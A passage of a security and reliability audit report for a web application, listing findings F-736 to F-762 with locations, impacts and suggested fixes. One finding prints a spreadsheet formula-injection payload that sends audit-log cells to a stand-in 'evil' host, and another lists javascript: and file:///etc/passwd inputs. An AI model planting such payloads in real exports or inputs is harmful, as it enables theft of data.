### F-736 [MEDIUM] 25 of 32 `appConfig` leaf settings are dead, including the whole `e2b` block, and `getConfig`/`getConfigValue` have no callers

- Area: P
- Location: `config/app.config.ts:5-23,97-138,140-177,179-187,191-198`
- What happens: I checked each leaf key against every file that mentions `appConfig`. Dead:
  `e2b.timeoutMinutes`, `e2b.timeoutMs`, `e2b.vitePort`, `e2b.viteStartupDelay`,
  `e2b.workingDirectory`, `codeApplication.defaultRefreshDelay`,
  `codeApplication.packageInstallRefreshDelay`,
  `codeApplication.maxTruncationRecoveryAttempts`, `ui.showModelSelector`,
  `ui.showStatusIndicator`, `ui.animationDuration`, `ui.maxChatMessages`,
  `ui.maxRecentMessagesContext`, `dev.enableDebugLogging`,
  `dev.enablePerformanceMonitoring`, `dev.logApiResponses`, `packages.useLegacyPeerDeps`,
  `packages.installTimeout`, `packages.autoRestartVite`, `files.excludePatterns`,
  `files.maxFileSize`, `files.textFileExtensions`, `api.maxRetries`, `api.retryDelay`,
  `api.requestTimeout`, `ai.modelApiConfig`. Live: `ai.defaultModel`, `ai.availableModels`,
  `ai.modelDisplayNames`, `ai.defaultTemperature`, `ai.maxTokens`,
  `ai.truncationRecoveryMaxTokens`, `codeApplication.enableTruncationRecovery`,
  `ui.toastDuration`. `getConfig` (`:191`) and `getConfigValue` (`:196`) have no callers.
- Trigger: n/a.
- Impact: the file reads as the application's configuration surface and is mostly inert. Three
  concrete traps: `api.requestTimeout: 30000` and `api.maxRetries: 3` look like the outbound
  HTTP policy, and no outbound call reads them (F-724 exists partly because of that);
  `dev.logApiResponses: true` and `dev.enableDebugLogging: true` look like production logging
  switches and control nothing (F-735); and `files.textFileExtensions` includes `'.env'`
  (`:173`), which reads as a decision to treat `.env` as project content — a reader has to grep
  the whole repo to learn it is never consulted.
- Confidence: Confirmed
- Suggested fix: delete every dead key and both accessor helpers. Move the four values that
  are genuinely operator-tunable (`ai.maxTokens`, `ai.defaultTemperature`,
  `ui.toastDuration`, `codeApplication.enableTruncationRecovery`) into
  `lib/settings/registry.ts` so they appear on `/admin/config`, per the admin-settings rule.

### F-737 [MEDIUM] `enableAnthropicCache` can never be true — `appConfig.ai.defaultModel` is a Google id

- Area: P
- Location: `lib/audit/ai-review.ts:104,113` (same pattern at `lib/import/generate-sections.ts:118`)
- What happens: `enableAnthropicCache = appConfig.ai.defaultModel.startsWith('anthropic/')`
  and `config/app.config.ts:29` sets `defaultModel: 'google/gemini-3-pro-preview'`, so the
  flag is a compile-time `false`. Worse, the model id passed on line 104 is ignored anyway:
  `getProviderForModel` uses `requestedModel: isDeepSeekModel(bare) ? bare : undefined`
  (`lib/ai/provider-manager.ts:67-69`), so an unknown id falls through to the configured
  chain.
- Trigger: every AI review (and every URL-import section generation).
- Impact: a prompt-caching branch that can never execute, plus five call sites
  (`lib/audit/ai-review.ts:104`, `lib/import/generate-sections.ts:117`,
  `lib/import/segment.ts:94`, `lib/memory/extract.ts:91`, `lib/skills/match.ts:136`) that
  appear to select a model and do not. A reader reasonably concludes the AI review runs on
  Gemini 3 Pro; it runs on whatever the DeepSeek chain resolves.
- Confidence: Confirmed
- Suggested fix: derive `enableAnthropicCache` from the model the provider actually resolved
  (`actualModel`, already returned on line 104) rather than from a constant, and stop passing
  `appConfig.ai.defaultModel` into `getProviderForModel` — call it with no argument so the
  code says what it does.

### F-738 [MEDIUM] `readRuntimeConfig` swallows every read failure, silently disabling Sentry; `runtimeConfigDiffers` ignores `region`

- Area: P
- Location: `lib/observability/runtime-config.ts:89-98,123-130,165-185`
- What happens: `readRuntimeConfig` has a blanket `catch { return null }` covering a missing
  file, an EACCES, a truncated write and malformed JSON alike, and logs nothing.
  `buildSentryInitOptions` (`lib/sentry/options.ts:34-35`) then returns `null` and
  `Sentry.init` is never called. Separately, `writeRuntimeConfig` persists `region`
  (`:115`) but `runtimeConfigDiffers` compares twelve fields and **not** `region` (`:171-184`),
  so `reconcileRuntimeConfig` never rewrites the file for a region change alone.
  `writeRuntimeConfig`'s catch also discards the underlying errno and throws a generic
  "not writable" message (`:123-130`).
- Trigger: a permission change on `/data/config/observability.json`, a partial write, or a
  Sentry org moved to a different region.
- Impact: server-side error reporting stops with no log line and no health signal that
  distinguishes it from "Sentry was never connected". Combined with F-703 (client reporting is
  a no-op), the product can be entirely blind while `/admin/health` reads plausibly. The
  `region` omission leaves the stale value in place indefinitely, which is one of the two
  causes of F-723.
- Confidence: Confirmed
- Suggested fix: distinguish ENOENT from every other failure in `readRuntimeConfig`, log the
  latter, and surface it on `/api/health` as a distinct state (the `describeDataDir`
  three-state pattern in `lib/health/check.ts:26-46` is the model). Add `region` to
  `runtimeConfigDiffers`, and include the original errno in the unwritable message.

### F-739 [MEDIUM] `runObservabilityStartup` emails every admin on every production boot when Sentry is unconfigured

- Area: P
- Location: `lib/observability/startup.ts:34-46` (send path `lib/observability/alerts.ts:10-19`)
- What happens: with no DSN in production the function writes a `dsn_config` check and calls
  `resolveSendAdminEmail(...)(dsnMissingEmail())` unconditionally. There is no
  already-alerted flag — unlike `maybeAlertLowSpace`
  (`lib/runtime/data-dir.ts:457-488`), which stores one — and no rate limiting, because
  observability mail is `emailClass: 'security'` and therefore exempt from the per-recipient
  bucket (`lib/email/rate-limit.ts:13-15`).
- Trigger: a production container restart with Sentry unconnected — including a crash loop,
  which restarts continuously.
- Impact: one email per admin per boot. A crash-looping container mails every admin every few
  seconds; the mailbox that is supposed to carry the next real `backup-db` failure fills with
  a message about a configuration state that has not changed. `lib/cron/record.ts:17-23`
  argues this exact point about permanently-red rows; the same reasoning applies here.
- Confidence: Confirmed
- Suggested fix: store an alerted marker keyed on `(reason, releaseSha)` in `AppSetting` and
  send at most once per release, clearing it when a DSN appears — the pattern
  `maybeAlertLowSpace` already implements. Send admin mail in parallel with
  `Promise.allSettled` while you are there, so one bad address does not silence the rest
  (`lib/observability/alerts.ts:10-19` is a serial `for` loop over `await sendEmail`).

### F-740 [MEDIUM] An unparseable certificate date reports the certificate as healthy, and any non-443 port skips the check as a pass

- Area: P
- Location: `lib/observability/certs.ts:23-25,36,48-52`
- What happens: `expiresAt = new Date(cert.valid_to)`. `valid_to` is an OpenSSL date string;
  when it fails to parse, `expiresAt.getTime()` is `NaN`, `remainingMs` is `NaN`, and
  `NaN < 14 days` is **false** — so the function returns
  `{ ok: true, detail: 'certificate valid until Invalid Date' }`. Separately, `:23-25` returns
  `ok: true` with "non-TLS port … certificate check skipped" for any port other than 443.
- Trigger: a certificate whose `valid_to` this Node build does not parse; or an app served on
  `https://host:8443`.
- Impact: the cron that exists to warn before a certificate expires reports success in both
  cases, so the site goes down on expiry with a green `check-certs` row behind it. The 14-day
  threshold is also a hardcoded literal with no way to change it.
- Confidence: Confirmed
- Suggested fix: reject when `Number.isNaN(expiresAt.getTime())` with the raw `valid_to` in
  the detail; treat a non-443 HTTPS port as a check to perform, not skip (only `http:` should
  skip); and move the 14-day threshold into the settings registry.

### F-741 [MEDIUM] The audit-log CSV export is vulnerable to spreadsheet formula injection

- Area: P
- Location: `lib/audit/admin.ts:77-109`
- What happens: `escape` quotes values containing `"`, `,` or newline and doubles embedded
  quotes — correct CSV — but does nothing about a leading `=`, `+`, `-`, `@`, tab or CR. Those
  cells are interpreted as formulas by Excel, LibreOffice and Google Sheets.
- Trigger: an admin exports the audit log from `/admin/audit` and opens the file. The
  attacker-controlled inputs reaching those cells are `actorEmail` (from the invite flow) and
  `diff`, which is `formatAuditDiff(row.before, row.after)` (`:73`) — i.e. arbitrary changed
  values, including project names and setting values.
- Impact: a project named `=HYPERLINK("http://evil/"&A1,"ok")` (or a `=cmd|…` DDE payload on
  Windows) executes in the admin's spreadsheet when the export is opened, exfiltrating other
  cells of the audit log. The audit log is the operator's trail of record, so it is the file
  most likely to be opened by the most privileged person.
- Confidence: Confirmed
- Suggested fix: prefix any cell whose first character is `=`, `+`, `-`, `@`, tab or CR with a
  single quote (or a leading tab) inside `escape`, and add a unit test for each dangerous
  prefix.

### F-742 [MEDIUM] `z.string().url()` accepts any URL scheme, so `javascript:` and `file:` pass avatar and template validation

- Area: P
- Location: `lib/profile/schema.ts:10-19`; `lib/templates/schema.ts:22,37`
- What happens: Zod's `.url()` validates by constructing `new URL(value)`, which accepts every
  scheme — `javascript:alert(1)`, `file:///etc/passwd`, `data:`. `updateProfileSchema` also
  accepts `z.string().startsWith('data:')` with **no length cap and no MIME allowlist**
  (`:14`). Both values are persisted (`lib/profile/actions.ts:39-45`;
  `lib/templates/store.ts:170`) and returned to clients
  (`lib/templates/public.ts:20`, `lib/projects/presence.ts:66`).
- Trigger: `updateProfile({ avatarUrl: 'javascript:…' })` — a member-level Server Action — or
  an admin template with a crafted `previewUrl`.
- Impact: in an `<img src>` a `javascript:` URL is inert, so this is not XSS today; it becomes
  XSS the moment either value is rendered as an `<a href>` (which is the natural way to show a
  template's "Preview" link). The unbounded `data:` avatar is a live problem regardless:
  `listRecentPresence` (`lib/projects/presence.ts:51-68`) returns `avatarUrl` for every viewer
  on every 30-second presence poll, so a multi-megabyte data URI is re-sent to every workspace
  member continuously.
- Confidence: Confirmed for the validation gap and the presence amplification; Needs check
  for whether any current component renders these as `href`.
- Suggested fix: replace `.url()` with a refinement that requires `http:`/`https:` in all
  three places, cap the `data:` branch at a small byte length with an image MIME allowlist (or
  drop it — `uploadAvatar` already stores real files), and exclude `avatarUrl` from the
  presence payload in favour of a per-user URL the client fetches once.

### F-743 [MEDIUM] `readGenerationInput` casts every field instead of validating it

- Area: P
- Location: `lib/projects/http.ts:45-75` (consumer `lib/projects/actions.ts:530-538`)
- What happens: `readCreateInput` (`:22-43`) is careful — it omits absent fields so Zod can
  default them and refuses to invent a stack. `readGenerationInput` immediately below does the
  opposite: `style`, `model`, `previewUrl`, `lastCode`, `progressMessage` are each
  `body.X as string | null | undefined`, and `thumbnailUrl` is cast from either
  `thumbnailUrl` or `screenshot` (`:54-59`). No Zod schema covers them —
  `updateProjectSchema` (`lib/projects/schema.ts:41-48`) validates only `name` and `status`.
- Trigger: `PATCH /api/projects/[id]` with `{"lastCode": {"a":1}}` or
  `{"previewUrl": 12345}`.
- Impact: unvalidated values reach `prisma.project.update` (`lib/projects/actions.ts:535-537`),
  where a non-string for a `String` column surfaces as a Prisma exception and a 500 rather
  than a 400. `lastCode` is the project's stored site content, so it is the field where an
  unvalidated write matters most: there is no length bound either, so a single PATCH can store
  an arbitrarily large blob. The comment at `:64-66` shows the cost of this shape — a dead
  `sandboxId` field carried through these casts until it threw `Unknown argument` on every
  generation persist.
- Confidence: Confirmed
- Suggested fix: give the generation fields a Zod schema (strings with max lengths,
  `generationStatus` as an enum, `previewUrl` as an http(s) URL) and parse instead of cast, so
  the failure is a 400 naming the field.

### F-744 [MEDIUM] `reactivateMember` writes no audit entry

- Area: P
- Location: `lib/team/actions.ts:165-184` (contrast `:108-116` and `:149-157`;
  action list `lib/audit/log.ts:12-15`)
- What happens: `updateMemberRole` and `deactivateMember` both call `writeAudit`.
  `reactivateMember` updates `isActive: true` and returns — no `writeAudit` call, and there is
  no `member.reactivate` entry in `REQUIRED_AUDIT_ACTIONS`.
- Trigger: an admin re-enables a deactivated account on `/admin/team`.
- Impact: restoring someone's access to an invite-only workspace — and to every project in it,
  since project reads are workspace-wide — leaves no trace. The audit log records the
  deactivation and then goes silent, so the trail reads as though the account is still
  disabled. `AGENTS.md:51` lists member changes as a recorded category.
- Confidence: Confirmed
- Suggested fix: add `member.reactivate` to `REQUIRED_AUDIT_ACTIONS` and call `writeAudit`
  with `before/after` on `isActive`, matching the sibling actions. A test asserting every
  `prisma.user.update` in `lib/team/actions.ts` is paired with a `writeAudit` would keep it.

### F-745 [MEDIUM] `resetPasswordWithToken` validates the token and consumes it in two separate steps

- Area: P
- Location: `lib/password-reset/service.ts:111-149`
- What happens: `peekResetToken` reads the row and checks `usedAt`/`expiresAt`
  (`:115-122`). The consuming write happens later, in a separate transaction, as
  `passwordResetToken.update({ where: { id }, data: { usedAt } })` (`:141-144`) — an
  unconditional update with no `usedAt: null` predicate and no row-count check.
- Trigger: two concurrent POSTs to `/api/auth/reset-password` with the same token (a
  double-clicked submit, a retried request, a link opened in two tabs).
- Impact: both requests pass `peekResetToken`, both run `passwordChangeWrites`, and the second
  password silently wins — so the user is left with a password they may not be the one who
  chose. The single-use guarantee the token exists to provide is not enforced atomically. This
  is the "a win is the UPDATE row count, never a re-read" rule
  (`.cursor/lessons-learned.md:27-30`) applied everywhere in `lib/jobs/` and missed here.
- Confidence: Confirmed
- Suggested fix: claim the token first with
  `updateMany({ where: { id, usedAt: null }, data: { usedAt: now } })` inside the transaction
  and abort when the count is 0; only then write the password. `peekResetToken` stays as the
  read-only check for rendering the form.

### F-746 [MEDIUM] `instrumentation.ts` lets two optional boot steps abort startup, while every other step is guarded

- Area: P
- Location: `instrumentation.ts:16-19` (contrast `:21-33,45-47`)
- What happens: `migrateEnvSentry`, `persistVolumeIdentity`, `reconcileRuntimeConfig`,
  `maybeAlertLowSpace` and `runObservabilityStartup` each carry a `.catch`. `reconcileJobsAtBoot()`
  (`:17`) and `recordCurrentRelease()` (`:19`) do not. `recordCurrentRelease` is itself
  internally guarded (`lib/deploy/record.ts:26-28`), but `reconcileJobsAtBoot` is not.
- Trigger: Postgres unavailable or slow at the moment the app boots — a compose restart where
  the database healthcheck passed but the connection pool is not ready, or a DB failover.
- Impact: the rejection escapes `register()` and the server fails to start, so a transient
  database hiccup turns into a container that will not boot — for a step whose purpose is
  best-effort cleanup of stale job rows, which `reap-jobs` handles a minute later anyway.
- Confidence: Confirmed for the missing guard; Likely for "the server fails to start"
  (Next's behaviour on a rejected `register()`).
- Suggested fix: wrap `reconcileJobsAtBoot()` in the same `.catch` + `console.warn` the
  neighbouring steps use. Serving with stale job rows is strictly better than not serving.

### F-747 [MEDIUM] `SIGTERM` handling hard-exits after 5 s without waiting for the HTTP server to close

- Area: P
- Location: `lib/runtime/shutdown.ts:16,45-51`; `docker-entrypoint.mjs:81-94`
- What happens: on `SIGTERM`/`SIGINT` the handler races `abandonInstanceJobs` against a 5-second
  deadline and then calls `process.exit(0)` in a `finally`. Nothing closes the HTTP listener
  first or waits for in-flight requests. The entrypoint forwards the signal
  (`docker-entrypoint.mjs:81-86`) and exits with the child's code.
- Trigger: every redeploy.
- Impact: in-flight requests are cut at the socket after at most 5 s — including the SSE
  generation stream, which is a long-lived response by design. A user mid-build sees the
  stream die rather than a clean "the server is deploying" message, which is the outcome the
  module's own comment (`:11-14`) says draining exists to avoid. `process.exit(0)` also
  reports success even when the drain timed out or threw.
- Confidence: Confirmed
- Suggested fix: stop accepting new connections and await the server's close (bounded by the
  same deadline) before `process.exit`, and exit non-zero when the drain timed out so the
  orchestrator's logs distinguish a clean drain from a truncated one.

### F-748 [MEDIUM] `updateTemplateRow` is a read-modify-write that rewrites every column from a stale read

- Area: P
- Location: `lib/templates/store.ts:139-181`
- What happens: the function calls `findTemplateById(id)`, merges the patch in JS
  (`next = { ...current, ...patch }`), then `UPDATE`s **all thirteen** columns from that merged
  object with no version predicate.
- Trigger: two admins editing the same template on `/admin/templates`, or one admin's two
  concurrent requests (a reorder plus a content edit).
- Impact: the second write silently reverts the first — a lost update on the prompt text that
  every project created from that template will use. `incrementUsageCount`
  (`lib/templates/usage.ts:5-11`) is deliberately atomic and carries a comment saying so; the
  edit path next to it is not.
- Confidence: Confirmed
- Suggested fix: `SET` only the columns present in `patch`, built with hand-numbered
  placeholders the way `lib/projects/list-sql.ts:22-27` and `lib/audit/admin.ts:35-39`
  already do, and add an `updatedAt`/version predicate so a stale write fails rather than
  wins.

### F-749 [MEDIUM] `attachGenerationInputTokens` mutates "the latest event", which races with a concurrent generation

- Area: P
- Location: `lib/usage-costs.ts:86-101`
- What happens: it finds the most recent `GenerationEvent` for the project, and if
  `inputTokens` is already set, silently returns. There is no event id threaded from the
  caller.
- Trigger: two generations in the same project overlapping (a follow-up started while a plan is
  finishing), which the project lock permits because both may be the same user
  (`lib/projects/lock.ts:92` re-entry).
- Impact: token counts are attributed to the wrong generation, or dropped entirely with no log
  line (`:93`). `/admin/usage` and the cost model built on
  `calculateEventCost(kind, isUrlClone, { tokensIn, tokensOut })`
  (`lib/usage-costs.ts:54-59`) are then wrong in a way no one can reconstruct.
- Confidence: Confirmed
- Suggested fix: have `logGenerationEvent` return the created event id and pass it to
  `attachGenerationInputTokens`, replacing the "latest row" heuristic with
  `updateMany({ where: { id, inputTokens: null } })` and logging a zero row count.

### F-750 [MEDIUM] `E2B_SANDBOX_ESTIMATE` is added to every generation's cost for a resource that no longer exists

- Area: P
- Location: `lib/usage-estimates.ts:6,22-26` (re-exported by `lib/usage-costs.ts:10`)
- What happens: `calculateEventCost` adds `E2B_SANDBOX_ESTIMATE` (0.02) to every `initial` and
  `followup` event. There are no sandboxes (`lib/workspace/sandbox-request.ts:1-4`).
- Trigger: every build and follow-up.
- Impact: `/admin/usage` over-states cost by $0.02 per generation — about 29% of the $0.07
  total for a non-clone build — and the inflated number is what an operator uses to set the
  workspace spend ceiling. There are also now two `calculateEventCost` implementations, one in
  `lib/usage-estimates.ts:15` and one in `lib/consumption/cost.ts` (the one actually imported
  at `lib/usage-costs.ts:5`), so the exported constants belong to the dead copy.
- Confidence: Confirmed
- Suggested fix: delete `E2B_SANDBOX_ESTIMATE` and the dead `calculateEventCost` from
  `lib/usage-estimates.ts`, keep the constants only where the live cost function reads them,
  and stop re-exporting them from `lib/usage-costs.ts`.

### F-751 [MEDIUM] Headless Chromium is launched inside the web server process, twice per audit, with `--no-sandbox` and a random debugging port

- Area: P
- Location: `lib/audit/a11y.ts:63-83,90-93`; `lib/seo/lighthouse.ts:50-66`
- What happens: `runA11yAudit` launches two Chromium instances concurrently
  (`:90-93`, desktop and 390px) in the Next server process. `runLighthouseSeo` launches a third
  with `--remote-debugging-port=${9222 + Math.floor(Math.random() * 800)}`
  (`lib/seo/lighthouse.ts:54`) — a random port with **no collision check**. Both pass
  `--no-sandbox`. Neither `chromium.launch` nor the Lighthouse run has a timeout (only
  `page.goto` has one, at 15 s).
- Trigger: any code audit or SEO audit; two concurrent SEO audits for the port collision.
- Impact: three Chromium processes per audit inside the serving container, with no concurrency
  limit across audits — the most likely OOM in the product, and it takes the whole app down
  rather than just the audit. Two concurrent SEO audits can pick the same debugging port, so
  Lighthouse may attach to the _other_ audit's browser and score the wrong page (reported as
  that project's result). `--no-sandbox` removes the renderer sandbox while rendering
  generated site content. A Lighthouse run with no timeout can hold an admin request open
  indefinitely.
- Confidence: Confirmed for the launches, the missing timeouts and the port collision;
  Likely for OOM (depends on container memory).
- Suggested fix: pick the debugging port by binding an ephemeral socket and reading the
  assigned port (or let Playwright choose and read the CDP endpoint), bound every browser run
  with an explicit timeout, serialise browser work behind a single-slot queue, and move it out
  of the request/serving process — a dedicated worker is the right home for something that
  forks Chromium.

### F-752 [MEDIUM] Model-supplied regexes are compiled and run per line over every file, with no length cap or timeout

- Area: P
- Location: `lib/file-search-executor.ts:86-99` (caller
  `app/api/generate-ai-code-stream/route.ts:616`)
- What happens: `SearchPlan.regexPatterns` comes from the model's search plan. `performSearch`
  compiles each with `new RegExp(pattern, 'i')` and calls `regex.test(line)` for **every line
  of every matching file**. There is no pattern-length limit, no complexity check and no
  timeout; JavaScript regex execution is synchronous and cannot be interrupted.
- Trigger: a generation follow-up whose search plan contains a catastrophically backtracking
  pattern — `(a+)+$`, `(\w+\s?)*$` and similar are shapes models emit naturally when asked for
  a "flexible" matcher.
- Impact: the Node event loop blocks for the duration, which stalls **every** request the
  server is handling — not just this generation. The invalid-pattern path is handled
  (`:95-97` catches a `SyntaxError`); the expensive-but-valid pattern is not.
- Confidence: Confirmed for the code path and the absence of any bound; Likely for
  exploitability (requires the model to emit a pathological pattern, which a user prompt can
  steer).
- Suggested fix: reject patterns over a modest length, run the search in a worker with a hard
  wall-clock budget, or use a linear-time engine (RE2-style) for model-supplied patterns.
  Failing the search plan is always cheaper than stalling the process.

### F-753 [MEDIUM] `dockerignore`-adjacent: `docker-compose.dev.yml` publishes Postgres on all interfaces with a trivial password

- Area: P
- Location: `docker-compose.dev.yml:11-15`
- What happens: `POSTGRES_USER: openlovable` / `POSTGRES_PASSWORD: openlovable` with
  `ports: ['5433:5432']` — no bind address, so Docker publishes on `0.0.0.0:5433`.
- Trigger: `pnpm db:up` (`package.json:21`) on a laptop on any shared network.
- Impact: the development database — which on this machine holds real project content, user
  rows and `AppSetting` secrets encrypted under a key that is also in `.env` — is reachable
  from the LAN with a guessable credential. `AGENTS.md:29-30` notes that Postgres is _shared_
  between both worktrees, so this is the live working database, not a throwaway.
- Confidence: Confirmed
- Suggested fix: bind to loopback (`'127.0.0.1:5433:5432'`) and generate the password rather
  than reusing the username. The compose file is the only place the port is published, so the
  change is one line.

### F-754 [MEDIUM] `lib/projects/prompt.ts` duplicates relative-time formatting and calls bare `toLocaleDateString()`

- Area: P
- Location: `lib/projects/prompt.ts:21-33` (duplicate of `lib/format-relative-time.ts:12-22`)
- What happens: two relative-time formatters with different thresholds and different strings —
  `'Just now'` vs `'just now'`, `'3d ago'` vs `'3 days ago'`, a 14-day cutoff vs a 30-day
  month — and `relativeTime` ends in `date.toLocaleDateString()` with no locale argument.
- Trigger: any project list or card rendering a timestamp.
- Impact: `toLocaleDateString()` resolves from the runtime locale, which differs between the
  server render and the browser, so React reports a hydration mismatch and the date can flip
  after hydration. `AGENTS.md:69` bans exactly this for admin timestamps and mandates
  `formatAdminDateTime`; the rule was not extended to the project surfaces. The two formatters
  also mean the same age reads differently in two places in the same UI.
- Confidence: Confirmed for the duplication and the un-pinned locale; Likely for an observed
  hydration warning.
- Suggested fix: delete `relativeTime` from `lib/projects/prompt.ts`, point its callers at
  `formatRelativeTime` (which takes an explicit `now` so SSR and hydration share a clock), and
  pin any absolute fallback to a fixed locale as the admin helpers do.

### F-755 [MEDIUM] `checkIndexing` reports an unreachable preview as a high-severity defect in the user's site

- Area: P
- Location: `lib/seo/checks/indexing.ts:18-28` (sentinel from `lib/seo/live.ts:21`)
- What happens: `fetchText` returns `status: 0` when the fetch throws — a DNS failure, a
  timeout, a connection reset. `checkIndexing` treats `status === 0` as
  `'Homepage preview returned an error'` at severity **high**, with the detail "Crawlers cannot
  index a failing homepage."
- Trigger: any transient network failure during an SEO audit, or a preview host that is
  briefly unavailable.
- Impact: an infrastructure hiccup on our side is presented to the user as a high-severity SEO
  fault in their site, and it feeds `seoScoreFromFindings`
  (`lib/signals/score.ts:90-95`) so the recorded quality number drops. The user's "Fix" button
  then asks the model to fix a homepage that is fine. This is the same
  "could not check ≠ broken" error the repo has fixed three times elsewhere
  (`lib/backup/verify.ts:23-29`, `lib/health/check.ts:15-17`,
  `lib/validation/build-check.ts:51-59`).
- Confidence: Confirmed
- Suggested fix: give `fetchText` a distinct unreachable result (not a status code) and have
  `checkIndexing` emit a `tool`-style informational finding — "the preview could not be
  reached, so indexing was not checked" — that is excluded from the score, keeping the `high`
  verdict for a real 4xx/5xx from the site.

### F-756 [MEDIUM] `isSitewideBlock` ignores `User-agent` grouping, so a single blocked bot reads as "robots.txt blocks the whole site"

- Area: P
- Location: `lib/seo/checks/robots.ts:24-29`
- What happens: the function tests the whole file for a `Disallow: /` line and for an
  `Allow: /` line, with no association to the `User-agent` block each belongs to.
- Trigger: a robots.txt that blocks one crawler —
  `User-agent: GPTBot` / `Disallow: /` — which is a common and deliberate configuration.
- Impact: a high-severity "robots.txt blocks the whole site" finding on a correctly configured
  site. The inverse is worse: an `Allow: /` anywhere in the file (for instance under a
  different agent) suppresses the finding even when `User-agent: *` really does disallow
  everything — so the one check that catches an accidentally de-indexed site can be silenced
  by an unrelated line.
- Confidence: Confirmed
- Suggested fix: parse robots.txt into agent groups and evaluate only the group that applies to
  `*` (or to the agents that matter), reporting per group.

### F-757 [MEDIUM] `sentryBeforeSend` never scrubs `event.message` or exception values, and the key regex misses connection strings

- Area: P
- Location: `lib/sentry/scrub.ts:1,47-86` (also used as the audit-log scrubber via
  `lib/audit/log.ts:104-105`)
- What happens: `sentryBeforeSend` scrubs `request.url`, `request.query_string`,
  `request.headers`, `request.data`, `request.cookies`, `extra`, `contexts` and breadcrumb
  data. It does **not** touch `event.message` or `event.exception.values[].value` — the two
  fields that carry the text of an error. `SENSITIVE_KEY` matches only key _names_
  (`/token|secret|password|key|pem/i`), so a value like
  `postgresql://navroop:PASSWORD@postgres:5432/navroop` inside a field named `message`,
  `detail`, `error` or `connectionString` passes through untouched.
- Trigger: any thrown error whose message embeds a credential — a Prisma connection error, an
  S3 signature failure that echoes the endpoint, a `pg_dump` stderr line surfaced through
  `lib/backup/db.ts:61`.
- Impact: secrets reach Sentry and, because the same `scrubSensitive` is what `writeAudit`
  relies on (`lib/audit/log.ts:104-105`), they can also be persisted into `AuditLog.before` /
  `after` and rendered on `/admin/audit`. `AGENTS.md:51` states audit-log secrets are
  "redacted with the Sentry scrubber", which is only true for named keys.
- Confidence: Confirmed for the missing message/exception scrubbing; Likely for a specific
  credential reaching it (depends on the error text).
- Suggested fix: run a value-level redactor over `message` and every
  `exception.values[].value` — a small set of patterns for URI credentials
  (`scheme://user:pass@`), bearer tokens and the provider key prefixes from F-729 — and reuse
  it in `scrubValue` so a sensitive _value_ is caught regardless of its key name.

### F-758 [MEDIUM] `readRequestId` accepts a client-supplied correlation id with no character validation

- Area: P
- Location: `lib/request-id.ts:9-13` (echoed at `lib/api/error-response.ts:27`, stored in
  `lib/request-context.ts:11`, tagged into Sentry at `lib/sentry/context.ts:16`, persisted at
  `lib/audit/log.ts:106`)
- What happens: any inbound `x-request-id` up to 64 characters is trusted verbatim — no
  charset restriction, no rejection of control characters — and becomes the request's
  correlation id everywhere: response headers, structured logs, Sentry tags and
  `AuditLog.requestId`.
- Trigger: `curl -H 'x-request-id: <anything>'`.
- Impact: a caller can choose its own audit-log and Sentry correlation id, so it can collide
  with another user's request id (making the trail ambiguous) or inject formatting into log
  lines and Sentry tags. `nanoid(12)` ids are otherwise unguessable, which is what makes them
  useful as a trail.
- Confidence: Confirmed
- Suggested fix: accept an inbound id only if it matches a conservative pattern
  (`/^[A-Za-z0-9_-]{8,64}$/`) and mint a fresh one otherwise; keep the client value in a
  separate `x-correlation-id` field if propagating a caller's trace is wanted.

### F-759 [MEDIUM] `lib/audit/actions.ts:98` and `lib/seo/actions.ts:88` read `project.previewUrl` into a variable that is always overwritten

- Area: P
- Location: `lib/audit/actions.ts:98,104-109`; `lib/seo/actions.ts:88,93-98`
- What happens: both files do `let previewUrl = project.previewUrl?.trim() || null;` and then
  unconditionally reassign it — to `signedPreviewUrl(...)` or `null` on the success path
  (`:104-106` / `:93-95`), and to `null` in the catch (`:109` / `:98`). The initial read is
  dead, and both files still `select: { previewUrl: true }` for it
  (`lib/audit/actions.ts:81`, `lib/seo/actions.ts:79`).
- Trigger: n/a.
- Impact: dead code that reads as a live fallback to a user-writable field. `previewUrl` _is_
  owner-writable via `PATCH /api/projects/[id]` (`lib/projects/actions.ts:535`), and it is
  passed to `page.goto` (`lib/audit/a11y.ts:68`), `fetch` (`lib/seo/live.ts:10`, which
  explicitly comments "Trusted host — do not route through safeFetch") and Lighthouse. Today
  the reassignment closes that path; the dead line is one careless edit away from opening a
  server-side request forgery through three different clients.
- Confidence: Confirmed (the reassignment is unconditional on both paths)
- Suggested fix: delete the dead initialiser and the `previewUrl` field from both `select`
  clauses, so the only value that can reach a fetcher is the signed internal URL. If a fallback
  to `project.previewUrl` is ever wanted, it must go through `lib/security/url-guard.ts`
  first.

### F-760 [MEDIUM] `type_safety` is collected and displayed but carries no weight in the composite score

- Area: P
- Location: `lib/signals/score.ts:1-23` (consumer `lib/signals/metrics.ts:57-75`)
- What happens: `QUALITY_SIGNAL_KINDS` lists eight kinds including `type_safety`.
  `QUALITY_SCORE_WEIGHTS` lists seven and omits `type_safety`; the comment says "Sum = 1",
  which is true only because it was left out. `composeOverallScore` iterates the weights
  (`:139`), so `type_safety` samples never contribute.
- Trigger: viewing `/admin/quality`.
- Impact: a signal is collected, stored, charted with a definition
  (`SIGNAL_DEFINITIONS.type_safety`, `:63-66`) and silently excluded from the number an
  operator uses to judge prompt changes. Combined with F-705 — `tsErrors` is always 0 — the
  metric would be meaningless anyway, but the omission hides that rather than surfacing it.
- Confidence: Confirmed
- Suggested fix: either give `type_safety` a weight and rebalance the seven others to sum to
  1, or remove it from `QUALITY_SIGNAL_KINDS` and stop collecting it. A unit test asserting
  `Object.keys(QUALITY_SCORE_WEIGHTS)` equals `QUALITY_SIGNAL_KINDS` would prevent the next
  divergence.

### F-761 [MEDIUM] `sendObservabilityTestEvent` holds an admin request open for up to 60 seconds

- Area: P
- Location: `lib/observability/admin.ts:11-12,150-158`
- What happens: after capturing and flushing, the function polls
  `findIssueByFingerprint` every 2 s until `TEST_TIMEOUT_MS` (60 s) elapses, awaiting inside
  the request.
- Trigger: an admin clicking "Send test event" on `/admin/integrations`.
- Impact: a single request occupies a server slot for a minute. Most reverse proxies and the
  Coolify/Traefik default terminate before 60 s, so the admin sees a gateway timeout and
  cannot tell whether the event arrived — the exact question the button exists to answer. Each
  poll is also an unbounded outbound Sentry call (F-724).
- Confidence: Confirmed
- Suggested fix: return immediately with the captured `eventId` and have the client poll a
  cheap status endpoint, or cap the in-request wait at ~10 s and report
  "sent, not yet confirmed" with a follow-up check.

### F-762 [MEDIUM] `next.config.ts` hardcodes one org's Sentry project and nests `automaticVercelMonitors` under a `webpack` key

- Area: P
- Location: `next.config.ts:40,42,59-71`
- What happens: `org: 'rewathi'` and `project: 'navroop-nextjs'` are literals in the build
  config, while every other Sentry setting is meant to come from the `Integration` store
